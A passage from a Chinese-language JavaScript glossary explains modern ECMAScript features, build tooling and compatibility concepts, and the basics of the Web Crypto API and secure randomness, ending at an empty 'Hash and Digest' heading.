转译是**在构建期**把新语法改写成老语法（如 `a?.b` → `a === null || a === void 0 ? void 0 : a.b`），产出一份能在旧引擎运行的新文件。术语本身是 transform + compile 的合成词，与「编译」（编译到机器码）不同——它仍是源码到源码（source-to-source）。关键细节：**polyfill 救不了语法**，旧引擎连解析都过不了可选链，所以你写多少运行时垫片都没用，只能靠转译；反过来 `Array.prototype.at` 这种「方法缺失」转译也帮不上忙，必须靠 polyfill。两者职责不重叠，需要哪个取决于缺的是语法还是 API。

也见 [Polyfill（垫片）](#polyfill垫片)、[Compiler and Bundler（编译器与打包器）](#compiler-and-bundler编译器与打包器)、[Source Map（源码映射）](#source-map源码映射)。

示例：[`01_syntax_basics/06_language_versions_and_compatibility.js`](01_syntax_basics/06_language_versions_and_compatibility.js)

### Compiler and Bundler（编译器与打包器）

现代前端工具链里，**打包器**（bundler，如 webpack / Rollup / Vite / esbuild）负责从入口出发解析模块图、合并与拆分产物、处理资源；**编译器 / 转译器**（如 Babel / SWC / TypeScript 编译器）负责把单个文件从一种语法变成另一种。两者常集成在同一个工具里，但从职责上要分清：打包解决「模块怎么组织成文件」，转译解决「语法怎么降到目标环境能懂」。关键细节：它们都会**改写代码**，所以产物的行号与源码不再对应，必须配合 Source Map 才能调试；目标环境的语法级别通常由 `browserslist` 之类的配置决定。

也见 [Transpile（转译）](#transpile转译)、[Source Map（源码映射）](#source-map源码映射)。

示例：[`39_tooling_and_workflow/06_bundlers_and_transpiling.js`](39_tooling_and_workflow/06_bundlers_and_transpiling.js)

### Feature Detection（特性检测）

特性检测是**在运行时直接问环境「这个能力在不在」**，而不是猜「版本号够不够新」：`typeof Array.prototype.at === 'function'`、`'groupBy' in Object`、`typeof Intl.Segmenter !== 'undefined'`。它是唯一可靠的兼容性判断方式，因为版本号与实际能力之间没有稳定对应（同一个浏览器不同版本、同一版本不同平台、Node 不同构建的 ICU 都可能不一样）。关键细节：检测要**检测到真正用到的那一层**（检测 `Intl` 存在不等于 `Intl.Segmenter` 存在）；对于 API 检测到缺失后再决定 polyfill、降级还是直接不用。

也见 [Graceful Degradation（优雅降级）](#graceful-degradation优雅降级)、[Polyfill（垫片）](#polyfill垫片)。

示例：[`01_syntax_basics/06_language_versions_and_compatibility.js`](01_syntax_basics/06_language_versions_and_compatibility.js)、[`34_modern_es_features/03_es2023_features.js`](34_modern_es_features/03_es2023_features.js)

### Graceful Degradation（优雅降级）

优雅降级指「在新环境用新能力，在旧环境**退到一个仍然可用**的形态，而不是直接崩掉」：`Intl.Segmenter` 不存在时退回按码点切分并提示「当前环境不支持精确计数」；`structuredClone` 不存在时退回受限的深拷贝实现。它与**渐进增强**是一对互补视角：渐进增强从「最小可用基线」出发往上加能力，优雅降级从「新能力」出发向下兜底，实际项目里两者都要有。关键细节：降级必须是**有意识的、被记录的**，需要日志或上报把「发生了降级」暴露出来，否则降级会悄悄变成长期的正确性缺陷。**常见误解**：以为套个 `try/catch` 就是降级——捕捉到错误后继续用错误的结果往下跑，比抛错更危险。

也见 [Feature Detection（特性检测）](#feature-detection特性检测)。

示例：[`01_syntax_basics/06_language_versions_and_compatibility.js`](01_syntax_basics/06_language_versions_and_compatibility.js)

### Syntax Feature vs API Feature（语法特性与 API 特性）

这是判断「该怎么兼容」的分水岭：**语法特性**改变的是代码的书写形式（可选链 `?.`、类字段 `x = 1`、`using` 声明、`#private`），旧引擎的**解析器**读不懂，会直接抛 `SyntaxError`；**API 特性**是新增的内置对象或方法（`Array.prototype.at`、`Object.groupBy`、`Intl.Segmenter`），语法上完全合法，只是运行时报 `undefined is not a function`。结论很硬：**语法缺失只能转译，API 缺失只能 polyfill**，二者不可互换。关键细节：语法特性是最容易被忽略的兼容性来源——你用 `using` 写得好好的，打包工具的老解析器直接报错，而这时候任何 polyfill 都无济于事。

也见 [Transpile（转译）](#transpile转译)、[Polyfill（垫片）](#polyfill垫片)。

示例：[`01_syntax_basics/06_language_versions_and_compatibility.js`](01_syntax_basics/06_language_versions_and_compatibility.js)、[`34_modern_es_features/08_explicit_resource_management.js`](34_modern_es_features/08_explicit_resource_management.js)

### Logical Assignment Operators（逻辑赋值运算符）

ES2021 引入的 `&&=`、`||=`、`??=` 把「先判断再赋值」合并成一个运算符，且**只在必要时才求值右侧**：`a ||= b` 等价于「`a` 为假值时把 `b` 赋给它」，`a ??= b` 只在 `a` 为 `null`/`undefined` 时赋值。关键区别在于 `??=` 与 `||=`：`0`、`''`、`false` 对 `||=` 算「假」会被覆盖，而 `??=` 只认 `null`/`undefined`，所以「配置项缺省值」要用 `??=`，否则用户显式填的 `0` 会被悄悄改掉。关键细节：右侧表达式**惰性求值**，`a ||= expensive()` 在 `a` 已为真时不会执行 `expensive()`，这既是性能优势也是副作用陷阱。

也见 [ES Release Year（ES 年度版本）](#es-release-yeares-年度版本)。

示例：[`34_modern_es_features/01_es2021_features.js`](34_modern_es_features/01_es2021_features.js)

### Numeric Separators（数字分隔符）

数字分隔符允许在数字字面量里插入下划线提高可读性：`1_000_000`、`0xFF_FF`、`1_234.567_8`，下划线**不改变数值**，纯粹是视觉分组。它解决的是「大额常量靠数零」的问题——`const TIMEOUT_MS = 30_000` 一眼能看出是三万毫秒，而 `30000` 要看两遍。关键细节：下划线只能出现在**数字之间**，`_1000`、`1000_`、`1__0`、`1_.0` 都是语法错误；也不能出现在 `BigInt` 的 `n` 前后。

也见 [ES Release Year（ES 年度版本）](#es-release-yeares-年度版本)。

示例：[`34_modern_es_features/01_es2021_features.js`](34_modern_es_features/01_es2021_features.js)

### Class Fields and Private Methods（类字段与私有方法）

类字段让实例属性可以**直接写在类体里**（`count = 0`），不必再在构造函数里逐个赋值；私有字段与方法用 `#` 前缀声明（`#secret`、`#compute()`），是**语言级的硬私有**——外部访问是语法错误，连 `Object.keys` 也看不到，而不是靠 `_` 下划线约定。关键细节：实例字段是**每次构造时按声明顺序初始化**的，因此会**遮蔽**原型上的同名属性，而且初始化发生在 `super()` 之后；私有成员不能被继承链外部访问，也不能用 `this['#x']` 绕过。**常见误解**：以为 `#` 字段能被反射列出——它根本不在普通属性表里，这也是它比 `Symbol` 或弱引用表更可靠的原因。

也见 [Static Initialization Block（静态初始化块）](#static-initialization-block静态初始化块)。

示例：[`34_modern_es_features/02_es2022_features.js`](34_modern_es_features/02_es2022_features.js)

### Static Initialization Block（静态初始化块）

静态块 `static { ... }` 提供了一段**在类定义时执行一次**的代码块，用来做需要多语句、需要 `try/catch`、或需要访问私有静态成员的静态初始化。在此之前只能用类外的一次性代码（拿不到 `#` 私有成员）或 `static x = (() => {...})()` 这类别扭写法。关键细节：静态块与静态字段**按书写顺序依次求值**，`static { }` 里可以访问同类中已声明的私有静态成员；块内的 `this` 指向类本身；抛错会导致整个类定义失败。

也见 [Class Fields and Private Methods（类字段与私有方法）](#class-fields-and-private-methods类字段与私有方法)。

示例：[`34_modern_es_features/02_es2022_features.js`](34_modern_es_features/02_es2022_features.js)

### Array.prototype.at（负索引取值）

`at(i)` 是 `arr[i]` 的补充：`i` 为**负数时从末尾倒数**（`arr.at(-1)` 是最后一个元素），越界返回 `undefined` 而不抛错，`String.prototype.at` 与 TypedArray 上同样存在。它替代了 `arr[arr.length - 1]` 这种又长又容易写错的写法，也让「倒数第 n 个」的意图在代码里直接可见。关键细节：**它不认识 Unicode**——`'👨‍👩‍👧‍👦'.at(-1)` 取到的是最后一个 UTF-16 码元而不是最后一个字素簇，按「用户感知字符」取值仍要用 `Intl.Segmenter`。

也见 [Grapheme Cluster（字素簇）](#grapheme-cluster字素簇)、[Non-destructive Array Methods（非破坏性数组方法）](#non-destructive-array-methods非破坏性数组方法)。

示例：[`34_modern_es_features/02_es2022_features.js`](34_modern_es_features/02_es2022_features.js)

### Non-destructive Array Methods（非破坏性数组方法）

ES2023 为数组补上了一组**返回新数组、不改原数组**的方法：`toSorted()`、`toReversed()`、`toSpliced()` 和 `with(index, value)`，对应原本会就地修改的 `sort`、`reverse`、`splice` 与下标赋值。它们的价值在于**可预测性**——调用方一眼就能看出原数组不会被改动，这对 React 之类依赖引用比较的框架尤其重要（就地 `sort` 会让 `useMemo` 的依赖判断失效）。关键细节：它们都是**浅拷贝**，元素本身如果是对象仍是共享引用；`with` 支持负索引，越界会抛 `RangeError`；这些方法在 TypedArray 上也存在。**常见误解**：以为 `toSorted` 是 `sort` 的别名而随手替换——原来的代码如果依赖「就地修改」（后续代码读同一数组），替换后行为会变。

也见 [Array.prototype.at（负索引取值）](#arrayprototypeat负索引取值)。

示例：[`34_modern_es_features/03_es2023_features.js`](34_modern_es_features/03_es2023_features.js)

### Object.groupBy and Map.groupBy（原生分组）

ES2024 引入两个静态方法做原生分组：`Object.groupBy(items, keyFn)` 返回一个**无原型对象**，键是函数返回的字符串，值是元素数组；`Map.groupBy(items, keyFn)` 返回 `Map`，键可以是**任意值**（对象、数字、布尔）。它们替代了过去那段几乎一模一样的 `reduce((acc, item) => { (acc[k] ??= []).push(item); return acc; }, {})`，语义更直白。关键细节：`Object.groupBy` 的返回值是 **null 原型对象**，`result.hasOwnProperty`、`result.toString` 都不存在，要判断键存在请用 `Object.hasOwn(result, key)`；`Map.groupBy` 用对象当键时是**引用相等**，两个内容相同的对象会被分成两组。

也见 [Iterator Helpers（迭代器助手）](#iterator-helpers迭代器助手)。

示例：[`34_modern_es_features/04_es2024_features.js`](34_modern_es_features/04_es2024_features.js)

### Iterator Helpers（迭代器助手）

迭代器助手（ES2025）把 `map`、`filter`、`take`、`drop`、`flatMap`、`reduce`、`toArray` 等方法**直接挂在迭代器原型上**，让迭代器也能链式调用，并且**全程惰性**：`iter.map(f).filter(g).take(3).toArray()` 只会从源头取到足够满足 `take(3)` 的元素，不会先把整个序列物化。这与数组的 `map/filter` 有本质区别——后者每一步都创建完整的新数组。关键细节：`Iterator.from(x)` 可以把任意可迭代对象转成迭代器助手；`Iterator.prototype` 上的方法是**通用的**，所以能消费无限序列（配合 `take` 使用）；`toArray()` 是终结操作，在无限迭代器上调用会挂死。

也见 [Lazy Evaluation（惰性求值）](#lazy-evaluation惰性求值)、[Set Methods（Set 集合运算方法）](#set-methodsset-集合运算方法)。

示例：[`34_modern_es_features/05_es2025_iterator_helpers.js`](34_modern_es_features/05_es2025_iterator_helpers.js)

### Lazy Evaluation（惰性求值）

惰性求值指「**只在真正需要结果时才计算**」，迭代器与生成器是 JavaScript 里最基本的实现方式：`function*` 里的代码在你调用 `next()` 之前一行都不会执行，因此可以表达无限序列、按需读取大文件、边拉取边处理。它与数组方法的**及早求值**（eager）形成对照，也是迭代器助手、`Array.fromAsync`、Streams 的 `pull` 背压模型共享的思想。关键细节：惰性带来两个副作用——**副作用发生时机后移**（`map` 里的日志可能在你以为之后的位置才打印）、**迭代器只能消费一次**（消费完再遍历得到空结果）。

也见 [Iterator Helpers（迭代器助手）](#iterator-helpers迭代器助手)、[highWaterMark and Backpressure（highWaterMark 与背压）](#highwatermark-and-backpressurehighwatermark-与背压)。

示例：[`34_modern_es_features/05_es2025_iterator_helpers.js`](34_modern_es_features/05_es2025_iterator_helpers.js)

### Set Methods（Set 集合运算方法）

ES2025 为 `Set` 补上了七个原生集合运算方法：`union`、`intersection`、`difference`、`symmetricDifference`（对称差，并集减去交集）、`isSubsetOf`、`isSupersetOf`、`isDisjointFrom`（是否有交集）。在此之前每个项目都要自己写一遍「用 `new Set([...a].filter(x => b.has(x)))` 求交集」的代码，容易写出 O(n²) 的实现或漏掉去重。关键细节：所有方法都**返回新的 `Set`，不修改原集合**（`isXxxOf` 系列返回布尔值）；它们按 SameValueZero 比较，因此 `NaN` 视为相等、`+0`/`-0` 视为相等；`difference` 是**单向**的，`a.difference(b)` 与 `b.difference(a)` 不同。

也见 [Iterator Helpers（迭代器助手）](#iterator-helpers迭代器助手)。

示例：[`34_modern_es_features/06_es2025_set_methods.js`](34_modern_es_features/06_es2025_set_methods.js)、[`23_collections/04_set_operations.js`](23_collections/04_set_operations.js)

### Promise.withResolvers（延迟兑现的 Promise 三件套）

`Promise.withResolvers()` 一次返回 `{ promise, resolve, reject }` 三件套，把 `resolve`/`reject` 暴露到 `executor` 之外使用。它解决的是经典的「**Promise 构造函数反模式**」——过去必须写 `let resolve; const p = new Promise(r => { resolve = r; })` 这种先声明再赋值的别扭代码。典型场景是把回调式 API 包成 Promise、或在事件回调里手动兑现一个等待中的 Promise。关键细节：它**只是语法糖**，没有增加取消能力；忘记在异常路径上调用 `reject` 会让这个 Promise **永远悬挂**（`await` 卡住、`.finally` 不执行），这是它最常见的误用。

也见 [Promise.try（同步执行并转成 Promise）](#promisetry同步执行并转成-promise)、[Error.cause（错误原因链）](#errorcause错误原因链)。

示例：[`34_modern_es_features/04_es2024_features.js`](34_modern_es_features/04_es2024_features.js)

### Promise.try（同步执行并转成 Promise）

`Promise.try(fn, ...args)` **同步调用** `fn` 并把结果统一包成 Promise：如果 `fn` 返回 Promise 就沿用它的状态，如果 `fn` **同步抛错**，则把异常转成 rejected Promise。它解决的是「混合错误源」问题——一个函数可能同步抛 `TypeError`、也可能返回 rejected Promise，调用方用 `try/catch` 只能接住前者、用 `.catch()` 只能接住后者，写起来必须两层都套。关键细节：`Promise.try` 里 `fn` 是**同步执行**的（不是排进微任务后才执行），所以调用时的副作用仍然立即发生；这让「不确定是否异步的清理/校验逻辑」有了统一的错误处理路径。

也见 [Promise.withResolvers（延迟兑现的 Promise 三件套）](#promisewithresolvers延迟兑现的-promise-三件套)、[AggregateError and SuppressedError（聚合错误与抑制错误）](#aggregateerror-and-suppressederror聚合错误与抑制错误)。

示例：[`34_modern_es_features/07_promise_try_and_regexp_escape.js`](34_modern_es_features/07_promise_try_and_regexp_escape.js)

### Array.fromAsync（异步可迭代对象转数组）

`Array.fromAsync(iterable)` 是 `Array.from` 的异步版本：它接受**异步可迭代对象**（async generator）或**元素是 Promise 的可迭代对象**，逐个等待后收集成一个数组并返回 Promise。它替代了 `for await (const x of src) out.push(x)` 这段样板代码，让「分页拉取全部数据」「把异步流读成数组」有一行写法。关键细节：它是**串行**消费的（依次 `await` 每个元素），源是无限异步迭代器时会永远不结束；对「元素是 Promise」的情况它会逐个等待，与 `Promise.all` 的并发语义不同——不要指望它提速。

也见 [Iterator Helpers（迭代器助手）](#iterator-helpers迭代器助手)、[Promise.try（同步执行并转成 Promise）](#promisetry同步执行并转成-promise)。

示例：[`34_modern_es_features/07_promise_try_and_regexp_escape.js`](34_modern_es_features/07_promise_try_and_regexp_escape.js)

### RegExp.escape（正则字面量转义）

`RegExp.escape(str)` 把任意字符串转义成**可以安全放进正则字面量**的形式：`'a.b*c'` → `'a\\.b\\*c'`。它解决的是「把用户输入（搜索关键词、文件名、标签）当字面量拼进 `new RegExp(...)`」时的注入与误匹配问题——用户输入里的 `.`、`*`、`(`、`\` 会让正则语义完全变样，甚至构成 ReDoS 风险。关键细节：它转义的**只是正则元字符**，转义结果仍应通过构造函数使用（`new RegExp(RegExp.escape(input))`），而不是指望它做 HTML 转义或 SQL 转义；首字符是数字等情况它也会按需处理，保证结果可直接嵌入。

也见 [RegExp v Flag（v 标志）](#regexp-v-flagv-标志)。

示例：[`34_modern_es_features/07_promise_try_and_regexp_escape.js`](34_modern_es_features/07_promise_try_and_regexp_escape.js)

### RegExp v Flag（v 标志）

`v` 标志（规范里叫 `unicodeSets`）是 ES2024 对 `u` 标志的增强，核心是让字符类支持**集合运算**：并集 `/[\p{Letter}\p{Number}]/v`、交集 `/[[a-z]&&[^aeiou]]/v`、差集 `/[\p{Letter}--[aeiou]]/v`，还能用 `\q{...}` 做多字符字符串匹配。它补上了 `u` 标志无法表达的「字母里去掉元音」这类需求，也让语法高亮、模板引擎、字符白名单校验的正则从几十行缩到一行。关键细节：`u` 与 `v` **互斥**，同时写是语法错误；`v` 模式下字符类的转义规则更严格（例如 `[()]` 需要写成 `[\(\)]`），迁移时要测试。

也见 [RegExp.escape（正则字面量转义）](#regexpescape正则字面量转义)。

示例：[`34_modern_es_features/04_es2024_features.js`](34_modern_es_features/04_es2024_features.js)

### JSON.rawJSON（原样输出的 JSON 片段）

`JSON.rawJSON(text)` 包出一个**原样输出**的标记对象，`JSON.stringify` 遇到它会直接写入 `text` 而不再做转义或数值转换。它是为「超出 IEEE 754 双精度的大整数 / 高精度小数」准备的：`JSON.stringify({ id: 12345678901234567890n })` 会抛错（BigInt 不可序列化），而 `JSON.rawJSON('12345678901234567890')` 可以原样写进结果，服务端仍收到精确数值。关键细节：传给它的字符串必须是**合法 JSON 片段**否则抛 `SyntaxError`；它**只能用于序列化方向**——`JSON.parse` 读回来仍是普通数值并可能丢精度，配套的 `JSON.isRawJSON()` 用于判断一个值是不是这种标记对象。

也见 [Reviver source Parameter（reviver 的 source 参数）](#reviver-source-parameterreviver-的-source-参数)。

示例：[`21_json/09_raw_json_and_big_numbers.js`](21_json/09_raw_json_and_big_numbers.js)

### Reviver source Parameter（reviver 的 source 参数）

`JSON.parse` 的 reviver 函数过去只拿到 `(key, value)`，而 `value` 是**已经转换过的结果**，因此无法知道原文写的是 `1.0` 还是 `1`、`1e2` 还是 `100`。新的 `source` 参数（`JSON.parse(text, (key, value, source) => ...)`，ES2025）把**该值的原始 JSON 片段**一并传进来，让「需要原文的解析」成为可能：大整数保持字符串形式、日期格式严格校验、保留小数位写法。关键细节：`source` 是**原始文本**而非重新序列化的结果，数组与对象的 `source` 也在；reviver 的 `this` 仍是当前容器，返回 `undefined` 会删除该键。

也见 [JSON.rawJSON（原样输出的 JSON 片段）](#jsonrawjson原样输出的-json-片段)。

示例：[`21_json/10_parse_source_context.js`](21_json/10_parse_source_context.js)

### Explicit Resource Management（显式资源管理）

显式资源管理（ES2025）引入了 `using x = expr` 与 `await using x = expr` 两种声明，让资源在**离开块作用域时自动释放**，等价于 C# 的 `using` / Python 的 `with` / Java 的 try-with-resources。它把「打开—使用—关闭」从「必须记得写 `finally`」变成声明式，也顺带解决了多个资源时 `finally` 嵌套的问题：清理按**声明的逆序**执行。关键细节：`using` 是**声明不是表达式**，不能放在表达式位置；初始值必须有 `[Symbol.dispose]`（异步版需 `[Symbol.asyncDispose]`），否则在**初始化那一刻**就抛 `TypeError`；`using x = null/undefined` 合法，表示「无资源」。这套语法很新，打包工具的解析器与旧运行时可能直接报错，属于典型的**语法特性**兼容问题。

也见 [Symbol.dispose and Symbol.asyncDispose（资源释放协议符号）](#symboldispose-and-symbolasyncdispose资源释放协议符号)、[Syntax Feature vs API Feature（语法特性与 API 特性）](#syntax-feature-vs-api-feature语法特性与-api-特性)。

示例：[`34_modern_es_features/08_explicit_resource_management.js`](34_modern_es_features/08_explicit_resource_management.js)

### Symbol.dispose and Symbol.asyncDispose（资源释放协议符号）

这是显式资源管理协议的两个**内置 Symbol**：一个对象只要有 `[Symbol.dispose]()` 方法，就是「可被 `using` 管理」的；有 `[Symbol.asyncDispose]()` 则可被 `await using` 管理。它们是「鸭子类型 + 约定方法名」的规范化——不再需要各库自定义 `close()`/`destroy()`/`release()` 的名字。关键细节：如果对象**同时**有 `asyncDispose` 与 `dispose`，`await using` **优先用 `asyncDispose`**；`dispose()` 本身是**同步**的，内部要异步完成清理必须用 `await using`；`using` 声明里显式传入 `null`/`undefined` 是合法的「空资源」。**常见误解**：普通对象、数组、Promise 都没有 `[Symbol.dispose]`，直接 `using` 会立刻报错。

也见 [Explicit Resource Management（显式资源管理）](#explicit-resource-management显式资源管理)、[SuppressedError（抑制错误）](#aggregateerror-and-suppressederror聚合错误与抑制错误)。

示例：[`34_modern_es_features/08_explicit_resource_management.js`](34_modern_es_features/08_explicit_resource_management.js)

### Error.cause（错误原因链）

`new Error(msg, { cause })` 允许在抛出新错误时**保留底层错误对象**：`throw new Error('加载用户失败', { cause: originalError })`。它解决的是「层层包装导致原始错误被吃掉」——过去只能把堆栈塞进 `message` 字符串（污染文案、丢失结构），现在通过 `err.cause` 可以一路访问到根因。关键细节：`cause` 是**普通属性**，不参与 `Error` 的默认字符串化，`err.toString()` 不会显示它，调试时要主动打印或递归遍历；`cause` 可以是任何值（不限于 Error），做错误上报时应把它一并序列化上传。它与显式资源管理中的 `SuppressedError` 一起构成了「错误链」的两条路径：主动包装用 `cause`，自动清理失败用 `suppressed`。

也见 [AggregateError and SuppressedError（聚合错误与抑制错误）](#aggregateerror-and-suppressederror聚合错误与抑制错误)。

示例：[`34_modern_es_features/02_es2022_features.js`](34_modern_es_features/02_es2022_features.js)、[`20_error_handling/06_error_cause.js`](20_error_handling/06_error_cause.js)

### AggregateError and SuppressedError（聚合错误与抑制错误）

`AggregateError` 把**多个错误打包成一个**抛出，通过 `err.errors` 拿到数组，典型场景是 `Promise.any` 全部失败时把每一个失败原因都带上；`SuppressedError` 用于**清理期间发生的错误覆盖了原有错误**的场景——`using` 块在退出时 `dispose()` 抛错，而块内本来就有一个异常，于是新错误作为 `suppressed`、原错误通过 `cause` 关联，保证**原始错误不丢失**。关键细节：`AggregateError` 的 `message` 需要自己写清楚，`errors` 的顺序与提交顺序一致；`SuppressedError` 同样有 `error`（被抑制的）与 `suppressed` 两个属性，打印时容易漏掉其中一个。

也见 [Error.cause（错误原因链）](#errorcause错误原因链)、[Explicit Resource Management（显式资源管理）](#explicit-resource-management显式资源管理)。

示例：[`34_modern_es_features/08_explicit_resource_management.js`](34_modern_es_features/08_explicit_resource_management.js)、[`20_error_handling/07_aggregate_error.js`](20_error_handling/07_aggregate_error.js)

### Top-Level await（顶层 await）

顶层 await 允许在**模块顶层**直接写 `await`，让模块的求值本身变成异步的：`const config = await loadConfig()` 之后，所有 `import` 这个模块的模块都会**等待它完成**再继续。它替代了「包一层 async IIFE」或「导出一个 Promise 让调用方自己 await」的写法，让模块初始化（读配置、连数据库、动态 import）的依赖关系由模块系统自动串起来。关键细节：它**只在 ESM 模块里可用**（CJS 里是语法错误）；会阻塞依赖它的模块图，用多了会让应用启动变慢甚至产生**循环依赖死锁**（A 等 B、B 等 A）；本仓库 `package.json` 设了 `type: module`，因此 `.js` 文件天然可用。

也见 [ES Release Year（ES 年度版本）](#es-release-yeares-年度版本)、[Explicit Resource Management（显式资源管理）](#explicit-resource-management显式资源管理)。

示例：[`34_modern_es_features/02_es2022_features.js`](34_modern_es_features/02_es2022_features.js)、[`19_modules/08_module_scope.js`](19_modules/08_module_scope.js)

### structuredClone（结构化克隆）

`structuredClone(value)` 是**内置的深拷贝**，支持循环引用、`Map`、`Set`、`Date`、`RegExp`、`ArrayBuffer`、`Blob` 等结构化可克隆类型，并且会正确复制嵌套结构而非共享引用。它取代了 `JSON.parse(JSON.stringify(x))` 这种漏洞百出的写法——后者会丢 `undefined`、把 `Date` 变成字符串、遇到循环引用直接抛错、无法处理 `Map`/`Set`。关键细节：它**不能克隆函数、类实例的方法、DOM 节点、`Symbol` 属性、`WeakMap`**，遇到会抛 `DataCloneError`；原型链上的自定义类会退化成普通对象（`instanceof` 失效），需要保留类型时应自己实现拷贝方法。

也见 [Lazy Evaluation（惰性求值）](#lazy-evaluation惰性求值)。

示例：[`09_objects/12_deep_clone.js`](09_objects/12_deep_clone.js)、[`03_data_types/11_mutable_vs_immutable.js`](03_data_types/11_mutable_vs_immutable.js)

### isWellFormed and toWellFormed（良构字符串与孤立代理项）

JavaScript 字符串是 UTF-16 码元序列，可能出现**孤立代理项**（lone surrogate）——只写了代理对的一半（如 `'\uD800'`），这种字符串**不是合法的 Unicode 文本**，在 `encodeURIComponent`、写入文件、发给服务端时可能抛错或产生乱码。ES2024 补上两个方法：`str.isWellFormed()` 检测是否良构，`str.toWellFormed()` 把孤立代理项替换成 `U+FFFD`（替换字符）从而修复。关键细节：`'abc'.length` 之类的长度统计不受影响，但**跨语言边界**（写文件、HTTP 传输、`TextEncoder`）时非法序列的行为是实现相关的，所以来自外部（用户输入、截断的 JSON）的字符串在传出前应做一次 `toWellFormed()`。**常见误解**：以为「截断字符串不会出问题」——按码元截断恰恰最容易切出孤立代理项。

也见 [Grapheme Cluster（字素簇）](#grapheme-cluster字素簇)。

示例：[`34_modern_es_features/04_es2024_features.js`](34_modern_es_features/04_es2024_features.js)

### Code Point and Code Unit（码点与码元）

补一个常与本册多个术语纠缠的基础概念：**码元**（code unit）是 UTF-16 的最小单位（16 位），`'a'.length` 数的是码元；**码点**（code point）是 Unicode 的字符编号，超出 `U+FFFF` 的字符（如 emoji）需要**两个码元**（代理对）表示，所以 `'😀'.length === 2` 而 `[...'😀'].length === 1`；**字素簇**则是用户感知的一个字符，还可能由多个码点组合。三者的关系是「码元 ≥ 码点 ≥ 字素簇」，`.length`、`[...str]`、`Intl.Segmenter` 分别对应这三层，做计数与截断前先想清楚要用哪一层。

也见 [Grapheme Cluster（字素簇）](#grapheme-cluster字素簇)、[Word Boundary（词边界）](#word-boundary词边界)。

示例：[`33_intl/05_intl_segmenter.js`](33_intl/05_intl_segmenter.js)

## Web 加密（Web Crypto API）

### Cryptography（密码学）

密码学是研究「在不安全信道上安全通信」的学科，落到工程上主要是四件事：**保密性**（加密，别人看不懂）、**完整性**（哈希/认证码，内容被改能发现）、**真实性**（签名/MAC，确认是谁发的）、**不可否认性**（只有你能生成、但任何人都能验证的签名）。关键细节：工程中用密码学最常见的错误不是「算法选得不够强」，而是**用错了类别**——拿哈希当加密存口令、拿编码当加密传输数据、拿签名当加密保护内容。牢记一条铁律：**不要自己发明协议，也不要用非标准库**，能用 `crypto.subtle` 就用它。

也见 [Encoding, Encryption and Hashing（编码、加密与哈希）](#encoding-encryption-and-hashing编码加密与哈希)。

示例：[`35_web_crypto/01_crypto_overview.js`](35_web_crypto/01_crypto_overview.js)

### Web Crypto API（Web 加密 API）

Web Crypto API 是浏览器与 Node（`globalThis.crypto`）共有的**标准加密接口**，分两层：`crypto.getRandomValues()` 提供同步的安全随机数，`crypto.subtle` 提供摘要、签名、加解密、密钥派生等异步能力。它相对第三方库的核心优势是**由运行时实现**：不增加包体积、密钥不经过 JS 层（可标记为不可导出）、常量时间比较由底层保证。关键细节：所有 `subtle` 方法都返回 Promise 且**只在安全上下文可用**（HTTPS 或 localhost），`file://` 页面与普通 HTTP 页面上 `crypto.subtle` 是 `undefined`；Node 侧另有 `node:crypto` 模块，两者算法互操作但 API 风格不同。

也见 [SubtleCrypto（crypto.subtle）](#subtlecryptocryptosubtle)、[Randomness（随机数）](#randomness随机数)。

示例：[`35_web_crypto/01_crypto_overview.js`](35_web_crypto/01_crypto_overview.js)

### SubtleCrypto（crypto.subtle）

`crypto.subtle` 是 Web Crypto 的**异步加密接口对象**（名字里的 subtle 取自「subtle algorithm」，暗示用错会静默失效），提供 `digest`、`sign`/`verify`、`encrypt`/`decrypt`、`deriveBits`/`deriveKey`、`generateKey`/`importKey`/`exportKey` 等方法。它与大多数 JS API 的最大不同是：**参数不是字符串而是算法对象与 `CryptoKey` 对象**，且所有方法都是 Promise。关键细节：`CryptoKey` 是**不可直接读出字节**的句柄，需要 `exportKey` 才能取出；`extractable: false` 可以防止密钥被导出到 JS 层，这是它比「字符串密钥」更安全的地方。

也见 [Key（密钥）](#key密钥)、[Key Format（密钥格式）](#key-format密钥格式)。

示例：[`35_web_crypto/01_crypto_overview.js`](35_web_crypto/01_crypto_overview.js)

### Randomness（随机数）

密码学里「随机」有三档质量：**可预测的伪随机**（`Math.random()`，种子可反推，绝不可用于安全场景）、**密码学安全伪随机**（CSPRNG，`crypto.getRandomValues`）、**真随机**（硬件熵源，最终仍由 CSPRNG 输出）。关键细节：`Math.random()` 的**任何**安全用途都是漏洞——用它生成令牌、盐值、IV、会话 ID、邀请码都会导致可预测或碰撞，而这类 bug 上线后极难发现，因为功能「看起来是好的」。判断标准很简单：只要这个随机值和「谁能访问什么」有关，就必须用 `crypto.getRandomValues`。

也见 [CSPRNG（密码学安全伪随机数生成器）](#csprng密码学安全伪随机数生成器)、[getRandomValues（安全随机数填充）](#getrandomvalues安全随机数填充)。

示例：[`35_web_crypto/01_crypto_overview.js`](35_web_crypto/01_crypto_overview.js)

### CSPRNG（密码学安全伪随机数生成器）

CSPRNG（Cryptographically Secure Pseudo-Random Number Generator）是「输出不可预测」的伪随机数生成器：即使攻击者知道全部历史输出，也无法推算下一个输出。它由操作系统熵源播种（Linux 的 `getrandom`、Windows 的 `BCryptGenRandom`），并由运行时包装成 `crypto.getRandomValues`。关键细节：CSPRNG 的**代价是慢**（相比 `Math.random()` 有数量级差距），所以热路径上应一次取够（如一次性填充一个 `Uint8Array`）而不是循环调用；它**不是**用来做统计模拟或游戏动画的，那些场景用 `Math.random()` 就够了。

也见 [Randomness（随机数）](#randomness随机数)。

示例：[`35_web_crypto/01_crypto_overview.js`](35_web_crypto/01_crypto_overview.js)

### getRandomValues（安全随机数填充）

`crypto.getRandomValues(typedArray)` 把随机字节**原地填进**传入的整数 TypedArray（`Uint8Array`、`Uint32Array` 等），返回同一个数组。它同时担当「CSPRNG 入口」与「通用随机字节来源」两个角色，是生成盐、IV、令牌、密钥材料的标准手段。关键细节：它是**同步**的，但**有配额限制**（每次调用最多 65536 字节，超出抛 `QuotaExceededError`）；它只接受整数 TypedArray，传普通数组或 `Float64Array` 会抛 `TypeError`；它**不能**直接生成任意范围的整数——需要 `[0, n)` 的随机数时要自己做拒绝采样，直接 `% n` 会引入取模偏差。

也见 [CSPRNG（密码学安全伪随机数生成器）](#csprng密码学安全伪随机数生成器)、[Initialization Vector（初始化向量）](#initialization-vector初始化向量)。

示例：[`35_web_crypto/01_crypto_overview.js`](35_web_crypto/01_crypto_overview.js)

### Hash and Digest（哈希与摘要）

